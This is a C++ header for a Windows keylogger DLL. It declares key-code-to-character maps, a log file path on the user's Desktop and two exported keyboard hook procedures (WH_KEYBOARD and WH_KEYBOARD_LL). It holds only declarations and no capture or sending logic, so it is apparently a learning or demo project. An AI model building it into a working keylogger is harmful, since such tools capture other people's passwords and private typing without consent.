#pragma once
#include <Windows.h>
#include <iostream>
#include <map>

using namespace std;

#ifdef KEYLOGGERPROCIMP_EXPORTS
#define KEYLOGGERPROC_API __declspec(dllexport)
#else
#define KEYLOGGERPROC_API __declspec(dllimport)
#endif

#define _T TEXT
#define BUFSIZE 1024

// keys can affect meaning of typing
static map<int, wchar_t const*>  vkeyToChars = {
    {VK_BACK, L"BACKSPACE"},
    {VK_TAB, L"TAB"},
    {VK_RETURN, L"ENTER"},
    {VK_DELETE, L"DEL"},
};

// convert key which is a combination of Shift + otherKey
// see common layouts in https://en.wikipedia.org/wiki/Computer_keyboard#Alphabetic
static map<int, wchar_t const*>  shiftKeyToChars = {
    {VK_OEM_3, L"~"},
    {0x31, L"!"},
    {0x32, L"@"},
    {0x33, L"#"},
    {0x34, L"$"},
    {0x35, L"%"},
    {0x36, L"^"},
    {0x37, L"&"},
    {0x38, L"*"},
    {0x39, L"("},
    {0x30, L")"},
    {0x30, L")"},
    {VK_OEM_MINUS, L"_"},
    {VK_OEM_PLUS, L"+"},
    {VK_OEM_4, L"{"},
    {VK_OEM_6, L"}"},
    {VK_OEM_5, L"|"},
    {VK_OEM_1, L":"},
    {VK_OEM_7, L"\""},
    {VK_OEM_COMMA, L"<"},
    {VK_OEM_PERIOD, L">"},
    {VK_OEM_2, L"?"},
};

static UINT64 sessionInterval = 30*1000;    // session duration timeout is 30s
static UINT64 lastSessionAt = 0;
static HWND lastHWnd = NULL;
wchar_t logPath[BUFSIZE] = {};   // %USERPROFILE%\Desktop\keylogger.txt
HANDLE hLogFile = INVALID_HANDLE_VALUE;

// keyboard event hook procedure implementation (WH_KEYBOARD)
extern "C" KEYLOGGERPROC_API LRESULT CALLBACK keyloggerProc(
    int    code,
    WPARAM wParam,
    LPARAM lParam
);

// keyboard event hook procedure implementation (WH_KEYBOARD_LL)
extern "C" KEYLOGGERPROC_API LRESULT CALLBACK lowKeyLoggerProc(
    int    nCode,
    WPARAM wParam,
    LPARAM lParam
);